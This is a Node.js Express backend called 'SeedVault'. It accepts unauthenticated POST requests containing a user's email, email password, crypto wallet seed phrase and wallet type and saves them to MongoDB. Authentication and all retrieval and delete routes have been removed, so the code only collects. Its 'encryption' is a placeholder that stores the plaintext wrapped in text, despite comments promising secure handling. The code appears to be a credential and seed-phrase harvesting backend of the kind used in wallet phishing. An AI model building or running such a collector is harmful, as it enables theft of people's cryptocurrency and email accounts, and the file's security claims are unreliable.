
require('dotenv').config(); // Load environment variables from .env file
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
// Removed bcrypt and jsonwebtoken as auth is removed

const app = express();
const PORT = process.env.BACKEND_PORT || 3001; // Use a different port than Next.js
const MONGODB_URI = process.env.MONGODB_URI;
// Removed JWT_SECRET

if (!MONGODB_URI) {
  console.error('FATAL ERROR: MONGODB_URI is not defined in .env file');
  process.exit(1);
}

// --- Mongoose Schemas ---

// Simplified Seed Phrase Schema - No longer linked to a User model
const SeedPhraseSchema = new mongoose.Schema({
  // Store encrypted email and password directly
  encryptedEmail: {
    type: String,
    required: true,
  },
  encryptedEmailPassword: {
      type: String,
      required: true,
  },
  walletName: {
    type: String,
    required: true,
    trim: true,
  },
  // Storing the encrypted seed phrase
  encryptedSeedPhrase: {
    type: String,
    required: true,
  },
  walletType: {
    type: String,
    required: true,
    // Consider adding an enum validator based on WalletTypes from definitions.ts
    // enum: WalletTypes // Requires importing/defining WalletTypes here
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

// Removed UserSchema and User model

const SeedPhrase = mongoose.model('SeedPhrase', SeedPhraseSchema);

// --- Middleware ---
app.use(cors()); // Enable CORS for all origins (adjust in production)
app.use(express.json()); // Parse JSON request bodies

// --- Database Connection ---
mongoose.connect(MONGODB_URI)
  .then(() => console.log('MongoDB connected successfully.'))
  .catch(err => {
    console.error('MongoDB connection error:', err);
    process.exit(1); // Exit if cannot connect to DB
  });

// --- Removed JWT Verification Middleware ---

// --- API Routes ---

// Removed Auth Routes (/api/auth/signup, /api/auth/login)

// --- Simplified Seed Phrase Saving Route ---
// No authentication middleware needed
app.post('/api/seed-phrases', async (req, res) => {
  // Destructure new fields: email, emailPassword
  const { email, emailPassword, walletName, seedPhrase, walletType } = req.body;

   // Validate all required fields are present
   if (!email || !emailPassword || !walletName || !seedPhrase || !walletType) {
     return res.status(400).json({ message: 'Missing required fields (email, emailPassword, walletName, seedPhrase, walletType).' });
   }

   // TODO: Add basic validation (e.g., email format, seed phrase structure) if needed server-side

   try {
       // --- !!! ENCRYPTION LOGIC NEEDED HERE !!! ---
       // Encrypt email, emailPassword, and seedPhrase before saving.
       // Use a robust method (e.g., AES-GCM) with a STRONG, securely managed key (e.g., from .env or KMS).
       // **NEVER store the raw data directly.**
       // Placeholder Encryption:
       const encryptPlaceholder = (data) => `ENCRYPTED(${data || ''})`; // Simple placeholder
       const encryptedEmail = encryptPlaceholder(email);
       const encryptedEmailPassword = encryptPlaceholder(emailPassword);
       const encryptedSeedPhrase = encryptPlaceholder(seedPhrase);
       // --- !!! END ENCRYPTION LOGIC !!! ---

       // Basic check if encryption produced something (adjust as needed for real encryption)
       if (!encryptedEmail || !encryptedEmailPassword || !encryptedSeedPhrase || encryptedEmail === 'ENCRYPTED()' || encryptedEmailPassword === 'ENCRYPTED()' || encryptedSeedPhrase === 'ENCRYPTED()') {
           console.error('[Save Seed] Encryption failed.');
           return res.status(500).json({ message: 'Failed to secure submitted data.' });
       }

       const newSeed = new SeedPhrase({
           encryptedEmail,
           encryptedEmailPassword,
           walletName,
           encryptedSeedPhrase, // Save the *encrypted* phrase
           walletType,
       });

       await newSeed.save();
       console.log(`[Save Seed] Seed phrase information saved successfully for wallet: ${walletName}`);

       // Return a simple success message - DO NOT return the saved data
       res.status(201).json({ message: 'Information saved successfully.' });

   } catch (error) {
       console.error(`[Save Seed Error] Wallet: ${walletName}`, error);
       // Handle potential validation errors from Mongoose
       if (error.name === 'ValidationError') {
            return res.status(400).json({ message: 'Validation Error', errors: error.errors });
       }
       res.status(500).json({ message: 'Error saving seed phrase information.' });
   }
});

// --- Removed Protected Routes ---
// Removed GET /api/dashboard/seed-phrases
// Removed GET /api/seed-phrases/:id/reveal
// Removed DELETE /api/seed-phrases/:id

// --- Root Route ---
app.get('/', (req, res) => {
  res.send('SeedVault Backend API is running!');
});

// --- Error Handling Middleware (Basic) ---
app.use((err, req, res, next) => {
  console.error("Unhandled Error:", err.stack);
  res.status(500).send('Something broke!');
});

// --- Start Server ---
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
